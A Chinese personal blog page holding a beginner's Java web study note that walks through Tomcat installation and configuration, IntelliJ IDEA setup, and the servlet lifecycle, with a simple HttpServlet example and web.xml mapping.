<!DOCTYPE html>
<html lang="en">

<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
<head>
  <!-- Google Analytics -->
  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-V3C5GQ73TE"></script>
    <script type="text/javascript">
      window.dataLayer = window.dataLayer || [];

      function gtag() {
        dataLayer.push(arguments);
      }
      gtag('js', new Date());

      gtag('config', 'G-V3C5GQ73TE');
    </script>
  

  <!-- Baidu Tongji -->
  
    <script type="text/javascript">
      // Originial
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?x";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  <!-- Baidu Push -->
  
    <script>
      (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
      })();
    </script>
  

  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>

  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>

  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="description" content="Morouu的大狗窝 ●&#39;◡&#39;●"/>
  <meta name="keyword" content="Morouu,morouu"/>
  <link rel="shortcut icon" href="//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302341051.png"/>

  <!-- Place this tag in your head or just before your close body tag. -->
  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>

  
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/beantech.min.css"/>

    <!-- Pygments Highlight CSS -->
    <link rel="stylesheet" href="/css/highlight.css"/>
    <link rel="stylesheet" href="/css/widget.css"/>
    <link rel="stylesheet" href="/css/rocket.css"/>
    <link rel="stylesheet" href="/css/signature.css"/>
    <link rel="stylesheet" href="/css/catalog.css"/>
    <link rel="stylesheet" href="/css/livemylife.css"/>

    
      <!-- wave start -->
      <link rel="stylesheet" href="/css/wave.css"/>
      <!-- wave end -->
    

    
      <!-- top start (article top hot config) -->
      <link rel="stylesheet" href="/css/top.css"/>
      <!-- top end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/scroll.css"/>
      <!-- ThemeColor end -->
    

    
      <!-- viewer start (Picture preview) -->
      <link rel="stylesheet" href="/css/viewer.min.css"/>
      <!-- viewer end -->
    

    
      <!-- Search start -->
      <link rel="stylesheet" href="/css/search.css"/>
      <!-- Search end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/themecolor.css"/>
      <!-- ThemeColor end -->
    

    

    
  

  <!-- Custom Fonts -->
  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
  <!-- Hux change font-awesome CDN to qiniu -->
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->

  <!-- ga & ba script hoook -->
  <link rel="canonical" href="https://morblog.cc/posts/82715091/">
  <title>
    
      学习笔记 - java-web学习(一) - Morouu的大狗窝 ●&#39;◡&#39;●
    
  </title>
<meta name="generator" content="Hexo 5.4.0"></head>


<!-- hack iOS CSS :active style -->

	<body ontouchstart="" class="body--light body--light">


		<!-- ThemeColor -->
		
		<!-- ThemeColor -->
<style type="text/css">
  .body--light {
    --light-mode: none;
    --dark-mode: block;
  }
  .body--dark {
    --light-mode: block;
    --dark-mode: none;
  }
  i.mdui-icon.material-icons.light-mode {
    display: var(--light-mode);
  }
  i.mdui-icon.material-icons.dark-mode {
    display: var(--dark-mode);
  }
</style>
<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
  <i class="mdui-icon material-icons light-mode"></i>
  <i class="mdui-icon material-icons dark-mode"></i>
</div>
<script>
  //getCookieValue
  function getCookieValue(a) {
    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
    return b
      ? b.pop()
      : '';
  }
  let themeMode = 'light';
  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
    let dbody = document.body.classList;
    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
  }

  //setCookieValue
  var toggleBtn = document.querySelector(".toggle");
  toggleBtn.addEventListener("click", function () {
    var e = document.body.classList.contains("body--dark");
    var cookieString = e
      ? "dark"
      : "light";
    var exp = new Date();
    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
  });
</script>

		

		<!-- Gitter -->
		
		<!-- Gitter -->
<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
<script>
  ((window.gitter = {}).chat = {}).options = {
    room: 'dmantick/morcruiser'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

		

		<!-- Navigation (contains search)-->
		<!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header page-scroll">
      <button type="button" class="navbar-toggle">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Morouu的大狗窝 ●&#39;◡&#39;●</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
    <div id="huxblog_navbar">
      <div class="navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
          <li>
            <a href="/">首页</a>
          </li>

          
          
          
          
          <li>
            <a href="/about/">
              
              关于
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/tags/">
              
              标签
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/archive/">
              
              归档
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/categories/">
              
              分类
              
              
            </a>
          </li>
          
          

          
          <li>
            <a class="popup-trigger">
              <span class="search-icon"></span>搜索</a>
          </li>
          

          <!-- LangSelect -->
          
          
          
          
          
        </ul>
      </div>
    </div>
    <!-- /.navbar-collapse -->
  </div>
  <!-- /.container -->
</nav>
<!-- progress -->
<div id="progress">
  <div class="line" style="width: 0%;"></div>
</div>

<script>
  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
  var $body = document.body;
  var $toggle = document.querySelector('.navbar-toggle');
  var $navbar = document.querySelector('#huxblog_navbar');
  var $collapse = document.querySelector('.navbar-collapse');

  $toggle.addEventListener('click', handleMagic)

  function handleMagic(e) {
    if ($navbar.className.indexOf('in') > 0) {
      // CLOSE
      $navbar.className = " ";
      // wait until animation end.
      setTimeout(function() {
        // prevent frequently toggle
        if ($navbar.className.indexOf('in') < 0) {
          $collapse.style.height = "0px"
        }
      }, 400)
    } else {
      // OPEN
      $collapse.style.height = "auto"
      $navbar.className += " in";
    }
  }
</script>


		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
		<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->

  <style type="text/css">
    .body--light {
      /* intro-header */
      --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }
    .body--dark {
      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }

    header.intro-header {
       /*post*/
        background-image: var(--intro-header-background-image-url-post);
        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
      
    }

    
      #signature {/*signature*/
        background-image: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302343273.png');
      }
    
  </style>





<header class="intro-header">
  <!-- Signature -->
  <div id="signature">
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
          
          <div class="post-heading">
            <div class="tags">
              
              <a class="tag" href="/tags/#安全" title="安全">安全</a>
              
              <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
              
            </div>
            <h1>学习笔记 - java-web学习(一)</h1>
            <h2 class="subheading"></h2>
            <span class="meta">
              Posted by morouu on
              2022-02-24
            </span>


            
            <!-- WordCount start -->
            <div class="blank_box"></div>
            <span class="meta">
              Estimated Reading Time <span class="post-count" >70</span> Minutes
            </span>
            <div class="blank_box"></div>
            <span class="meta">
              Words <span class="post-count">14.8k</span> In Total
            </span>
            <div class="blank_box"></div>
            <!-- WordCount end -->
            
            
            <!-- 不蒜子统计 start -->
            <span class="meta" id="busuanzi_container_page_pv">
              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
            </span>
            <!-- 不蒜子统计 end -->
            


          </div>
          
        </div>
      </div>
    </div>
  </div>

  
  <!-- waveoverlay start -->
  <div class="preview-overlay">
    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
      <defs>
        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
      </defs>
      <g class="preview-parallax">
        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
      </g>
    </svg>
  </div>
  <!-- waveoverlay end -->
  

</header>



		<!-- Main Content (Post contains
	Pager、
	tip、
	socialshare、
	gitalk、gitment、disqus-comment、
	Catalog、
	Sidebar、
	Featured-Tags、
	Friends Blog、
	anchorjs、
	) -->
		<!-- Modify by Yu-Hsuan Yen -->
<!-- Post Content -->
<article>
  <div class="container" style="margin-left: 10%;">
    <div class="row">
      <!-- Post Container -->
      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">

        <h1>学习笔记 - java-web学习(一)</h1>
<h2 id="前言">- 前言 -</h2>
<p>没啥水平的玩意，就当作给自己写着，便于以后翻看。</p>
<h2 id="环境搭建">- 环境搭建 -</h2>
<h3 id="tomcat">- tomcat -</h3>
<p>作为一个免费开源的轻量web应用服务器， <code>tomcat</code> 可以看作是 <code>Apache</code> 服务器的扩展，常用以作为 <code>Servlet</code> 和 <code>JSP</code> 容器。</p>
<h4 id="安装">- 安装 -</h4>
<p>这是有关在 <code>windows</code> 中 <code>tomcat</code> 的安装，先从官网 <a target="_blank" rel="noopener" href="https://tomcat.apache.org/">https://tomcat.apache.org/</a> 下载，然后解压到合适的目录👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221717579.png" alt="image-20220222171726488"></p>
<h4 id="环境变量">- 环境变量 -</h4>
<p>确保以下环境变量得以配置👇</p>
<ul>
<li><code>JAVA_HOME=C:\Java\jdk-11.0.12</code></li>
<li><code>CATALINA_HOME=F:\javaEnv\tomcat\apache-tomcat-9.0.58</code></li>
<li><code>CATALINA_BASE=F:\javaEnv\tomcat\apache-tomcat-9.0.58</code></li>
<li><code>CLASSPATH=F:\javaEnv\tomcat\apache-tomcat-9.0.58\lib\jsp-api.jar;F:\javaEnv\tomcat\apache-tomcat-9.0.58\lib\servlet-api.jar</code></li>
<li><code>PATH=C:\Java\jdk-11.0.12\bin;%PATH%</code></li>
</ul>
<h4 id="启动-停止">- 启动/停止 -</h4>
<p>其中在 <code>windows</code> 下开启 <code>tomcat</code> 服务需运行 <code>bin\startup.bat</code> 文件(运行 <code>bin\shutdown.bat</code> 以关闭)，图方便且为了能兼容多种版本的 <code>tomcat</code> 可以直接改 <code>startup.bat</code> 文件👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221731760.png" alt="image-20220222173114694"></p>
<h4 id="配置">- 配置 -</h4>
<p>可以在 <code>lib\server.xml</code> 中改 <code>tomcat</code> 的默认端口👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221733024.png" alt="image-20220222173320980"></p>
<p>或者更改主机配置，比如👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221743172.png" alt="image-20220222174353137"></p>
<p>其中 <code>name</code> 值可以为 <code>ip</code> 或是 <code>域名</code>，如上图 <code>name</code> 的值为 <code>localhost</code> 会从 <code>hosts</code> 获取对应的 <code>127.0.0.1</code> 的 <code>ip</code> 因此可以通过👇</p>
<ul>
<li><code>http://localhost:9058/</code></li>
<li><code>http://127.0.0.1:9058/</code></li>
</ul>
<p>任意一个进行访问。</p>
<p>但如果 <code>name</code> 的值为 <code>127.0.0.1</code> 需要更改以下内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221802509.png" alt="image-20220222180237433"></p>
<p>才能够用 <code>http://localhost:9058/</code> 进行访问。</p>
<h3 id="IntelliJ-IDEA">- IntelliJ IDEA -</h3>
<p>之所以用 <code>IntelliJ IDEA</code> 完全是因为懒 <del>有正版授权</del> 。</p>
<h4 id="配置tomcat">- 配置tomcat -</h4>
<p>依次点击 <code>File</code> =&gt; <code>settings</code> =&gt; <code>Build, Execution, Deployment</code> =&gt; <code>Application Servers</code> ，然后再点 <code>+</code> 添加 <code>Tomcat Server</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221817686.png" alt="image-20220222181734610"></p>
<p>确保目标路径是正确的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221818925.png" alt="image-20220222181825885"></p>
<p>之后点击 <code>OK</code> ，后面的 <code>IntelliJ IDEA</code> 机会自动补上👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221819729.png" alt="image-20220222181919654"></p>
<h4 id="新建项目">- 新建项目 -</h4>
<p>依次点击 <code>File</code> =&gt; <code>New</code> =&gt; <code>Module...</code> =&gt; <code>Application Servers</code> ， 然后进行设置👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221824832.png" alt="image-20220222182421753"></p>
<p>设置好后点击 <code>Next</code> ，选择需要的 <code>Dependencies</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221826902.png" alt="image-20220222182615814"></p>
<p>最后点击 <code>Finish</code> 即可完成项目的新建。</p>
<h4 id="运行">- 运行 -</h4>
<p>在 <code>IntelliJ IDEA</code> 的右上角👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230910995.png" alt="image-20220223091036948"></p>
<p>点击 <code>+</code> 然后找到 <code>Tomcat Server</code> ，并选择 <code>Local</code>👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230911535.png" alt="image-20220223091111466"></p>
<p>新建完毕后先点击 <code>Deployment</code> 将上面新建的项目的 <code>war</code> 添入👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230911033.png" alt="image-20220223091143940"></p>
<p>选择上面新建的项目👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230912428.png" alt="image-20220223091201366"></p>
<p>再回到 <code>Server</code> 进行设置👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230914887.png" alt="image-20220223091456793"></p>
<p>同时最好把把这两个选了👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230916966.png" alt="image-20220223091657930"></p>
<p>这样在 <code>tomcat</code> 运行时更变代码会同步。</p>
<p>然后可以在 <code>WEB-INF</code> 目录新建一个目录 ，目录名可以随便起，比如 <code>lib</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230920779.png" alt="image-20220223092048740"></p>
<p>再设置一下结构👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230924940.png" alt="image-20220223092431854"></p>
<p>最后点击右上角的 <code>=&gt;</code> 即可👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230919607.png" alt="image-20220223091947466"></p>
<p>由于在 <code>IntelliJ IDEA</code> 使用 <code>tomcat</code> 实质是先将写好的项目先打包成 <code>war</code> ，然后放入 <code>tomcat</code> 加载，所以像是 <code>web.xml</code>  是独立于 <code>tomcat</code> 的配置而只与这个项目相关。</p>
<h4 id="环境变量-2">- 环境变量 -</h4>
<p>另外，在 <code>IntelliJ IDEA</code> 的运行中是直接执行 <code>bin\catalina.bat</code> 文件，实际上在 <code>startup.bat</code> 最后也会对这个文件进行执行👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230945014.png" alt="image-20220223094502882"></p>
<p>所以如果要自定义相应的环境变量得到相应 <code>tomcat</code> 的 <code>bin\catalina.bat</code> 文件中修改，或是更改运行的环境变量👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230958040.png" alt="image-20220223095815961"></p>
<h2 id="内容">- 内容 -</h2>
<h3 id="servlet">- servlet -</h3>
<p><code>servlet</code> 即 <code>server applet</code> ，全称为 <code>java servlet</code> 。从功能上来看，<code>servlet</code> 是一种用 <code>java</code> 编写的，运行在支持 <code>java</code> 语言服务器上的组件。通常来说，一个 <code>servlet</code> 是指所有实现了 <code>servlet</code> 接口的类， <code>servlet</code> 容器用以管理多个 <code>servlet</code>。而 <code>tomcat</code> 即是可以对多个 <code>servlet</code> 进行管理的容器，负责将客户端的请求包装后发送给对应的 <code>servlet</code> ，在由 <code>servlet</code> 处理完毕后将相应内容返回给客户端。</p>
<h4 id="生命周期">- 生命周期 -</h4>
<p><strong>①[装载和实例化]</strong> 当服务器启动时，服务器会去 <code>WEB-INF/web.xml</code> 文件中解析有关 <code>servlet</code> 的配置，装载各个 <code>servlet</code> 。若解析到某个 <code>servlet</code> 拥有 <code>load-on-startup=1</code> 配置时，就会将该 <code>servlet</code> 实例化；而对没有 <code>load-on-startup=1</code> 配置的 <code>servlet</code> 只有在客户端第一次请求时才会实例化(若 <code>servlet</code> 中含有构造方法，则会在此时执行)。</p>
<p><strong>②[初始化]</strong> 当一个 <code>servlet</code> 被实例化后，<code>servlet</code> 容器会去调用该 <code>servlet</code> 实例的 <code>init()</code> 方法。</p>
<p><strong>③[服务]</strong> 当客户端进行请求时，<code>servlet</code> 容器会将从 <code>客户端</code> 发来的 <code>http</code> 请求封装成 <code>ServletRequest</code> 对象，并实例化一个 <code>ServletResponse</code> 对象用作响应，然后将这两个对象作为参数去调用对应 <code>servlet</code> 的 <code>service()</code> 方法进行处理(若对应的 <code>servlet</code> 没有被实例化则在首次请求时会将对应的 <code>servlet</code> 实例化)。</p>
<p><strong>④[销毁]</strong> 当 <code>servlet</code> 容器不再需要某个 <code>servlet</code> 实例时，会调用该 <code>servlet</code> 实例的 <code>destroy()</code> 方法。</p>
<h4 id="代码">- 代码 -</h4>
<p>在 <code>servlet</code> 这个接口中定义了以下方法👇</p>
<ul>
<li><code>public void init(ServletConfig config) throws ServletException</code></li>
<li><code>public ServletConfig getServletConfig()</code></li>
<li><code>public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException</code></li>
<li><code>public String getServletInfo()</code></li>
<li><code>public void destroy()</code></li>
</ul>
<p>其中 <code>GenericServlet</code> 类实现了 <code>servlet</code> 接口👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231016467.png" alt="image-20220223101655370"></p>
<p>而 <code>HttpServlet</code> 类继承了 <code>GenericServlet</code> 类，并对 <code>service</code> 方法做了一个包装👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231018598.png" alt="image-20220223101837442"></p>
<p>会通过判断客户端的请求方法来调用自身的以下方法👇</p>
<ul>
<li><code>doGet</code></li>
<li><code>doHEAD</code></li>
<li><code>doPUT</code></li>
<li><code>doDELETE</code></li>
<li><code>doOPTIONS</code></li>
<li><code>doTRACE</code></li>
</ul>
<p>那么就可以通过继承 <code>HttpServlet</code> 类来自定义 <code>servlet</code> 的处理过程了。</p>
<h4 id="示例">- 示例 -</h4>
<p>比如说写一个对 <code>GET</code> 请求方法简单的处理过程，其中 <code>Main</code> 类通过继承 <code>HttpServlet</code> 类( <code>HttpServlet</code> =&gt; <code>GenericServlet</code> =&gt; <code>Servlet</code>)实现了 <code>Servlet</code> 接口👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jspstudy3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== Main() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== init() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== doGet() ==&quot;</span>);</span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;doGet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>以上代码用 <code>Main</code> 类还重写了 <code>HttpServlet</code> 类的 <code>init</code> 方法，并手动添加了构造方法，目的是对比这几种方法的调用顺序和逻辑。</p>
<p>然后是 <code>web.xml</code> 👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>main<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.jspstudy3.Main<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>main<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/main<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上内容先是用 <code>&lt;servlet&gt;</code> 标签声明一个名为 <code>main</code> 的 <code>servlet</code> ，其对应的类为 <code>com.example.jspstudy3.Main</code> ，进而用 <code>&lt;servlet-mapping&gt;</code> 标签来告诉 <code>tomcat</code> 当以哪种格式 <code>url</code>访问时会交给名为 <code>main</code> 的 <code>servlet</code> 处理。</p>
<p>其中一个 <code>servlet</code> 可由多个 <code>&lt;servlet-mapping&gt;</code> 标签对应，而 <code>&lt;servlet-mapping&gt;</code> 标签中的 <code>&lt;url-pattern&gt;</code> 内容为正则表达式，但仅可以用形如以下的通配符来表示👇</p>
<ul>
<li><code>*.[后缀名]</code></li>
<li><code>/开头，*结尾</code></li>
</ul>
<p>同时会根据表达式的模糊度来决定匹配的优先级，越准确的表达式优先级越高，越模糊的通配符优先级越低。</p>
<p>但如果每个 <code>serlvet</code> 都在 <code>web.xml</code> 就会显得特别臃肿，在 <code>servlet3.0+</code> 时可以用以下方式替代 <code>serlvet</code> 在 <code>web.xml</code> 的配置👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, urlPatterns = &quot;/main&quot;)</span></span><br></pre></td></tr></table></figure>
<p>如果是多个表达式👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, urlPatterns = &#123;&quot;/main&quot;,&quot;/Main&quot;&#125;)</span></span><br></pre></td></tr></table></figure>
